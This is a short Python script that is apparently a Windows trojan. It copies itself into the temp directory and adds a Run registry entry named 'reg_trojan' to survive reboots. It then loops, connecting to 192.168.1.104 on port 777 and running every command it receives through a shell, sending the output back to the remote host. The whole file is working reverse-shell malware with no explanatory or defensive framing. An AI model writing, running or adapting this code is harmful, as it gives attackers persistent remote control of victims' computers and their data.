import socket, os
import subprocess
import tempfile

ip = '192.168.1.104'
port = 777
path = tempfile.gettempdir()
filename = os.path.basename(__file__)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def autorun():
	try:
		os.system('copy ' + filename + ' ' + path)
		os.system('REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v reg_trojan /d '+path+'\\'+filename)
	except:
		pass 

	connection(ip, port)

def connection(ip, port):
	while True:
		try:
			s.connect((ip, port))
			execute(s)
		except Exception as e:
			print(e)
		
def execute(s):
	while True:
		s.send(b'$>')
		data = s.recv(1024)
		command = data.decode("utf-8")
		
		if command[:-1] == 'exit':
			exit(0)

		if 'cd' in command:
			os.chdir(command[3:].strip('\n'))
			command = 'cd'
		
		process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		output, error = process.communicate()
		s.send(output + error)

	s.close()

autorun()